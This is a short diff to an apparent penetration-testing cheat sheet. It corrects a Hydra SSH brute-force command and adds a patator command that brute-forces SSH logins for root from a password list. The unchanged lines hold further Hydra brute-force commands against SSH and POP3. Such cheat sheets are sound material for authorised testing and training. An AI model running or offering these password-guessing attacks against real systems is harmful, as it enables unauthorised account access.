@@ -18,7 +18,12 @@ hydra -v -V -u -L <user-list> -P <pass-list> -t 1 -u <ip> ssh
 hydra -v -V -u -L <user-list> -p 'known-password' -t 1 -u <ip> ssh 
 
 # Hydra SSH Against Known username on port 22
-hydra <ip> -s 22 ssh -l -P <pass-list>
+hydra <ip> -s 22 ssh -l <username> -P <pass-list>
+
+# patator ssh brutefoce 22 with username root
+patator ssh_login host=<ip> port=22 user=root password=FILE0 0=<pass-list> --allow-ignore-failures persistent=0 -x ignore:egrep="Authentication failed."
+
+
 
 # Hydra POP3 Brute Force
 hydra -l <username> -P <pass-list> -f <ip> pop3 -V 
